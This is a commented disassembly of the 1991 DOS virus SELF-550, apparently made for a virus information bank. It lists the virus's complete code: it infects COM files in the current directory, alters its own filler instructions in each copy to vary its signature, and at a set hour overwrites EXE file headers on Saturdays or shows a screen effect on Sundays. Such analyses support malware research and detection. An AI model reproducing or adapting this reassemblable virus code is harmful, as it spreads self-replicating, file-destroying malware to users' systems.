

;===============================================
; Virus SELF-550
;
; disassembled by: Andrzej Kadlof may 1991
;
; (C) Polish Section of Virus Information BAnk
;===============================================

0100 EB43           JMP     0145

0102  4D 53                     ; virus signature MS
0104  2A 2E 43 4F 4D 00         ; *.COM, 0
010A  00                        ; not used
010B  2A 2E 45 58 45 00         ; *.EXE, 0

; working area and locad DTA

0111  00 00 00 00               ; working bytes
0115  00 00                     ; file length
0117  04 00                     ; divider

; local DTA

0119  00 00 00 00 00 00 00
0120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0140  00 00 00 00 00 

; dummy part of virus code, changed in any copy of virus

0145 51             PUSH    CX

0145 51             PUSH    CX
0146 59             POP     CX
0147 51             PUSH    CX
0148 59             POP     CX
0149 51             PUSH    CX
014A 59             POP     CX
014B 1E             PUSH    DS
014C 1F             POP     DS

; stable code
; copy virus above 64 Kb

014D 50             PUSH    AX          ; store AX
014E 8CCA           MOV     DX,CS
0150 8BC2           MOV     AX,DX
0152 050010         ADD     AX,1000     ; 4 Kb
0155 8BD0           MOV     DX,AX   
0157 8EC2           MOV     ES,DX       ; bufer above 64 Kb block
0159 BE0001         MOV     SI,0100     ; source
015C 33FF           XOR     DI,DI       ; destination
015E B92602         MOV     CX,0226     ; virus length (457)
0161 90             NOP
0162 F3A4           REPZ    MOVSB       ; move virus code
0164 BA1901         MOV     DX,0119     ; locall DTA
0167 B41A           MOV     AH,1A       ; set DTA
0169 CD21           INT     21

; find first COM file in current directory

016B BA0401         MOV     DX,0104     ; *.COM, 0
016E B90600         MOV     CX,0006     ; System and Hiden
0171 B44E           MOV     AH,4E       ; find first
0173 CD21           INT     21

0175 7303           JAE     017A

0177 E9C200         JMP     023C        ; check system date

017A BA3701         MOV     DX,0137     ; file name
017D B443           MOV     AH,43       ; file attributes
017F B001           MOV     AL,01       ; set
0181 B92000         MOV     CX,0020     ; archive
0184 CD21           INT     21

0186 B8023D         MOV     AX,3D02     ; open file for read/write
0189 CD21           INT     21

; read file just above virus code

018B 8BD8           MOV     BX,AX
018D 06             PUSH    ES
018E 1F             POP     DS
018F BA2602         MOV     DX,0226     ; above virus
0192 90             NOP
0193 B9FFFF         MOV     CX,FFFF     ; 64 Kb
0196 B43F           MOV     AH,3F       ; read full file
0198 CD21           INT     21

019A 052602         ADD     AX,0226     ; wirus length
019D 90             NOP
019E 2EA31501       MOV     CS:[0115],AX
01A2 813E28024D53   CMP     WORD PTR [0228],534D  ; virus signature MS
01A8 7503           JNZ     01AD

01AA E98000         JMP     022D        ; close file, find next

01AD 33C9           XOR     CX,CX
01AF 8BD1           MOV     DX,CX
01B1 B80042         MOV     AX,4200     ; move file ptr to BOF
01B4 CD21           INT     21

01B6 B42C           MOV     AH,2C       ; get time
01B8 CD21           INT     21

; modufy own code at 0145h

01BA 8AC2           MOV     AL,DL
01BC 98             CBW
01BD 40             INC     AX
01BE 99             CWD
01BF 2E8B0E1701     MOV     CX,CS:[0117]
01C4 F7F9           IDIV    CX
01C6 42             INC     DX
01C7 D1C2           ROL     DX,1
01C9 8BFA           MOV     DI,DX
01CB C78543000607   MOV     WORD PTR [DI+0043],0706
01D1 B42C           MOV     AH,2C    ; ','
01D3 CD21           INT     21

01D5 8AC2           MOV     AL,DL
01D7 98             CBW
01D8 40             INC     AX
01D9 99             CWD
01DA 2E8B0E1701     MOV     CX,CS:[0117]
01DF F7F9           IDIV    CX
01E1 42             INC     DX
01E2 D1C2           ROL     DX,1
01E4 8BFA           MOV     DI,DX
01E6 C78543001E1F   MOV     WORD PTR [DI+0043],1F1E
01EC B42C           MOV     AH,2C    ; ','
01EE CD21           INT     21

01F0 8AC2           MOV     AL,DL
01F2 98             CBW
01F3 40             INC     AX
01F4 99             CWD
01F5 2E8B0E1701     MOV     CX,CS:[0117]
01FA F7F9           IDIV    CX
01FC 42             INC     DX
01FD D1C2           ROL     DX,1
01FF 8BFA           MOV     DI,DX
0201 C7854300525A   MOV     WORD PTR [DI+0043],5A52
0207 B42C           MOV     AH,2C    ; ','
0209 CD21           INT     21

020B 8AC2           MOV     AL,DL
020D 98             CBW
020E 40             INC     AX
020F 99             CWD
0210 2E8B0E1701     MOV     CX,CS:[0117]
0215 F7F9           IDIV    CX
0217 42             INC     DX
0218 D1C2           ROL     DX,1
021A 8BFA           MOV     DI,DX
021C C78543005159   MOV     WORD PTR [DI+0043],5951

0222 33D2           XOR     DX,DX
0224 2E8B0E1501     MOV     CX,CS:[0115]  ; new file length
0229 B440           MOV     AH,40       ; write file
022B CD21           INT     21

022D B43E           MOV     AH,3E       ; close file
022F CD21           INT     21

0231 0E             PUSH    CS
0232 1F             POP     DS
0233 B44F           MOV     AH,4F       ; find next
0235 CD21           INT     21

0237 7203           JB      023C

0239 E93EFF         JMP     017A        ; infect file

; restore DTA

023C BA8000         MOV     DX,0080     ; standard DTA
023F B41A           MOV     AH,1A       ; set DTA
0241 CD21           INT     21

0243 B42C           MOV     AH,2C       ; get system time
0245 CD21           INT     21

0247 80FD05         CMP     CH,05       ; hour
024A 7403           JZ      024F

024C E99900         JMP     02E8        ; jump to application

024F B42A           MOV     AH,2A       ; get system date
0251 CD21           INT     21

0253 3C06           CMP     AL,06       ; saturday?
0255 7447           JZ      029E        ; destroy some EXE files

0257 3C00           CMP     AL,00       ; sunday?
0259 7403           JZ      025E        ; video efect

025B E98A00         JMP     02E8        ; jump to application

; video efect

025E B40F           MOV     AH,0F
0260 CD10           INT     10

0262 50             PUSH    AX
0263 32E4           XOR     AH,AH
0265 B005           MOV     AL,05
0267 CD10           INT     10

0269 B95100         MOV     CX,0051
026C B87F01         MOV     AX,017F
026F 2D0F04         SUB     AX,040F
0272 8BF0           MOV     SI,AX
0274 51             PUSH    CX
0275 56             PUSH    SI
0276 1F             POP     DS
0277 1E             PUSH    DS
0278 33F6           XOR     SI,SI
027A B800B8         MOV     AX,B800
027D 8EC0           MOV     ES,AX
027F 33FF           XOR     DI,DI
0281 B90040         MOV     CX,4000
0284 F3A4           REPZ    MOVSB
0286 58             POP     AX
0287 054000         ADD     AX,0040
028A 8BF0           MOV     SI,AX
028C 59             POP     CX
028D 83E901         SUB     CX,+01
0290 83F900         CMP     CX,+00
0293 75DF           JNZ     0274

0295 58             POP     AX
0296 B400           MOV     AH,00
0298 B003           MOV     AL,03
029A CD10           INT     10

029C CD20           INT     20          ; terminate process

029E BA1901         MOV     DX,0119
02A1 B41A           MOV     AH,1A       ; set DTA
02A3 CD21           INT     21

02A5 BA0B01         MOV     DX,010B     ; *.EXE
02A8 B90600         MOV     CX,0006     ; system and hiden
02AB B44E           MOV     AH,4E       ; find first
02AD CD21           INT     21

02AF 7303           JAE     02B4

02B1 EB2C           JMP     02DF
02B3 90             NOP

02B4 BA3701         MOV     DX,0137
02B7 B443           MOV     AH,43       ; file attributes
02B9 B001           MOV     AL,01       ; set
02BB B92000         MOV     CX,0020     ; archive
02BE CD21           INT     21

02C0 B8023D         MOV     AX,3D02     ; open for read/write
02C3 CD21           INT     21

02C5 8BD8           MOV     BX,AX       ; handle
02C7 BA0B01         MOV     DX,010B     ; buffer
02CA B91C00         MOV     CX,001C     ; header size
02CD B440           MOV     AH,40       ; write file
02CF CD21           INT     21

02D1 B43E           MOV     AH,3E       ; close file
02D3 CD21           INT     21

02D5 0E             PUSH    CS
02D6 1F             POP     DS
02D7 B44F           MOV     AH,4F       ; find next
02D9 CD21           INT     21
02DB 7202           JB      02DF        ; terminate

02DD EBD5           JMP     02B4        ; destroy EXE file

; restore DTA

02DF BA8000         MOV     DX,0080     ; standard DTA
02E2 B41A           MOV     AH,1A       ; set DTA
02E4 CD21           INT     21

02E6 CD20           INT     20          ; terminate proces

; restore COM file and start it

02E8 BE0403         MOV     SI,0304
02EB B92200         MOV     CX,0022
02EE 33FF           XOR     DI,DI
02F0 F3A4           REPZ    MOVSB
02F2 5B             POP     BX
02F3 2EC70611010000 MOV     WORD PTR CS:[0111],0000
02FA 2E8C061301     MOV     CS:[0113],ES
02FF 2EFF2E1101     JMP     DWORD PTR CS:[0111]

0304 1E             PUSH    DS
0305 07             POP     ES
0306 BE2603         MOV     SI,0326
0309 BF0001         MOV     DI,0100
030C B9FFFF         MOV     CX,FFFF
030F 2BCE           SUB     CX,SI
0311 F3A4           REPZ    MOVSB
0313 2EC70600010001 MOV     WORD PTR CS:[0100],0100
031A 2E8C1E0201     MOV     CS:[0102],DS
031F 8BC3           MOV     AX,BX
0321 2EFF2E0001     JMP     DWORD PTR CS:[0100]  ; jump to COM application


